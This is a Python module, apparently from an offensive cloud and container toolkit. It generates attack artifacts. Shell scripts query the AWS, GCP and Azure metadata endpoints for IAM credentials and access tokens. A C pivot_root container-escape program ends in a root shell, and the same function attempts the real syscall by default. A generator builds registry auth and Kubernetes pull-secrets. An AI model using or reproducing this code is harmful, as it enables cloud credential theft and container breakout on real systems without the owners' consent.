def nm20_cloud_metadata_probe_gen(args):
    """Generate IMDS (169.254.169.254) recon scripts for AWS/GCP/Azure — PLAN ONLY, never hits the endpoint."""
    r = _res("metadata_probe_gen", armed=False)
    scripts = {}
    scripts["aws"] = "\n".join([
        "# AWS IMDS (v2, token-required) recon — run on target instance",
        "TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token)",
        "H='X-aws-ec2-metadata-token: '$TOKEN",
        "curl -s -H \"$H\" http://169.254.169.254/latest/meta-data/",
        "curl -s -H \"$H\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "curl -s -H \"$H\" http://169.254.169.254/latest/user-data/",
        "",
    ])
    scripts["gcp"] = "\n".join([
        "# GCP metadata recon",
        "H='Metadata-Flavor: Google'",
        "curl -s -H \"$H\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "curl -s -H \"$H\" 'http://169.254.169.254/computeMetadata/v1/?recursive=true'",
        "",
    ])
    scripts["azure"] = "\n".join([
        "# Azure IMDS recon",
        "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
        "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
        "",
    ])
    written = {}
    for k, v in scripts.items():
        written[k] = _write_artifact("nm20_imds_recon_%s.sh" % k, v)
    r["artifacts"] = written
    r["target"] = "169.254.169.254 (link-local IMDS)"
    r["note"] = ("scripts written but NOT executed by design: the IMDS endpoint is never "
                 "contacted by this power regardless of args; run the artifacts on the target")
    if args.get("arm", True):
        r["armed"] = True
        r["arm_result"] = "refused: IMDS contact is out-of-scope; artifacts are the deliverable"
    return r


def nm20_cloud_pivot_root_gen(args):
    """Generate a real pivot_root container-escape C artifact; {'arm': true} attempts the syscall (needs root+CAP_SYS_ADMIN)."""
    r = _res("pivot_root_gen", armed=False)
    c_src = "\n".join([
        "/* nm20.cloud.pivot_root_gen — real pivot_root(2) escape PoC",
        " * requires root + CAP_SYS_ADMIN; run inside a writable mount ns */",
        "#define _GNU_SOURCE",
        "#include <sched.h>",
        "#include <sys/mount.h>",
        "#include <sys/syscall.h>",
        "#include <unistd.h>",
        "#include <stdio.h>",
        "int main(void) {",
        "    if (unshare(CLONE_NEWNS) < 0) { perror(\"unshare\"); return 1; }",
        "    mount(NULL, \"/\", NULL, MS_REC | MS_PRIVATE, NULL);",
        "    mkdir(\"/tmp/nm20_root\", 0755);",
        "    if (mount(\"/\", \"/tmp/nm20_root\", NULL, MS_BIND, NULL) < 0) { perror(\"bind\"); return 1; }",
        "    if (chdir(\"/tmp/nm20_root\") < 0) { perror(\"chdir\"); return 1; }",
        "    if (syscall(SYS_pivot_root, \".\", \".\") < 0) { perror(\"pivot_root\"); return 1; }",
        "    umount2(\".\", MNT_DETACH);",
        "    execl(\"/bin/sh\", \"sh\", NULL);",
        "    return 0;",
        "}",
        "",
    ])
    art = _write_artifact("nm20_pivot_root.c", c_src)
    r["artifact"] = art
    r["build"] = "gcc -static -O2 -o /tmp/nm20_pivot_root %s" % art
    r["would_do"] = ("unshare(mnt ns) -> private-bind '/' -> pivot_root to detach host root; "
                     "effective only when combined with breaking the mount ns")
    if args.get("arm", True):
        r["armed"] = True
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            SYS_pivot_root = 155
            os.makedirs("/tmp/nm20_arm_root", exist_ok=True)
            rc = libc.syscall(ctypes.c_long(SYS_pivot_root),
                              ctypes.c_char_p(b"/tmp/nm20_arm_root"),
                              ctypes.c_char_p(b"/tmp/nm20_arm_root"))
            err = ctypes.get_errno()
            r["arm_result"] = {"rc": rc, "errno": err,
                               "detail": os.strerror(err) if rc else "pivot_root SUCCEEDED (you are root in a new ns?)"}
        except Exception as e:  # noqa: BLE001
            r["arm_result"] = "syscall attempt failed: %s" % e
    else:
        r["note"] = "artifact only; pass {'arm': true} to attempt the real syscall"
    return r


def nm20_cloud_registry_auth_gen(args):
    """Generate a REAL docker config.json / pull-secret artifact with base64 auth for a registry."""
    r = _res("registry_auth_gen")
    registry = str(args.get("registry", "registry.example.com"))
    user = str(args.get("username", "user"))
    pw = str(args.get("password", "REDACTED"))
    email = str(args.get("email", "user@example.com"))
    auth = base64.b64encode(("%s:%s" % (user, pw)).encode()).decode()
    cfg = {"auths": {registry: {"auth": auth, "email": email}},
           "HttpHeaders": {"User-Agent": "Docker-Client/24.0.0"}}
    art = _write_artifact("nm20_registry_config.json", json.dumps(cfg, indent=2))
    os.chmod(art, 0o600)
    k8s_secret = {
        "apiVersion": "v1", "kind": "Secret",
        "metadata": {"name": "nm20-regcred"},
        "type": "kubernetes.io/dockerconfigjson",
        "data": {".dockerconfigjson": base64.b64encode(json.dumps(cfg).encode()).decode()},
    }
    art2 = _write_artifact("nm20_registry_pullsecret.yaml",
                           "# kubectl apply -f this file\n" + json.dumps(k8s_secret, indent=2))
    r["artifacts"] = [art, art2]
    r["registry"] = registry
    r["auth_b64"] = auth if pw == "REDACTED" else auth[:8] + "...redacted"
    r["note"] = "supply real creds via args; defaults emit a placeholder config"
    return r


POWERS = {
    "nm20.cloud.container_detect": nm20_cloud_container_detect,
    "nm20.cloud.cgroup_escape_audit": nm20_cloud_cgroup_escape_audit,
    "nm20.cloud.k8s_token_probe": nm20_cloud_k8s_token_probe,
    "nm20.cloud.k8s_api_probe_gen": nm20_cloud_k8s_api_probe_gen,
    "nm20.cloud.docker_socket_probe": nm20_cloud_docker_socket_probe,
    "nm20.cloud.oci_bundle_gen": nm20_cloud_oci_bundle_gen,
    "nm20.cloud.seccomp_profile_gen": nm20_cloud_seccomp_profile_gen,
    "nm20.cloud.apparmor_probe": nm20_cloud_apparmor_probe,
    "nm20.cloud.selinux_probe": nm20_cloud_selinux_probe,
    "nm20.cloud.metadata_probe_gen": nm20_cloud_metadata_probe_gen,
    "nm20.cloud.namespace_diff": nm20_cloud_namespace_diff,
    "nm20.cloud.pivot_root_gen": nm20_cloud_pivot_root_gen,
    "nm20.cloud.overlayfs_audit": nm20_cloud_overlayfs_audit,
    "nm20.cloud.registry_auth_gen": nm20_cloud_registry_auth_gen,
    "nm20.cloud.iam_policy_analyzer": nm20_cloud_iam_policy_analyzer,
    "nm20.cloud.s3_bucket_lint": nm20_cloud_s3_bucket_lint,
    "nm20.cloud.terraform_secret_scan": nm20_cloud_terraform_secret_scan,
    "nm20.cloud.kubeconfig_audit": nm20_cloud_kubeconfig_audit,
    "nm20.cloud.escape_matrix": nm20_cloud_escape_matrix,
    "nm20.virt.vm_detect": nm20_virt_vm_detect,
}

if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.cloud.container_detect"]({}), indent=2, default=str))
